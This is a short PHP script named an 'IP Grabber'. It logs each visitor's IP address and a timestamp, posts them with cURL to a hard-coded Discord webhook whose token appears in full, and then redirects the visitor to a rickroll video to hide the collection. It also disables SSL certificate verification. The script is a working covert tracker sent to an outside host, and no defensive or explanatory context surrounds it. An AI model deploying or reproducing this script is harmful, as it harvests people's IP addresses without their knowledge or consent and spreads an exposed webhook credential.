<?PHP

$rickroll = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley';

$localIP = getHostByName(php_uname('n'));
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";

$url = "https://discord.com/api/webhooks/964447613069971496/lC6D_8geP2h4rt0PDzQQMA6IOGVpfA-7ndTu9Le4j-iIG4G4aTSojk32n3FW-VsF2l1e";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => 'IP Grabber', 'content' => $line ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);


echo '<script>window.location.replace("'. $rickroll .'");</script>'

?>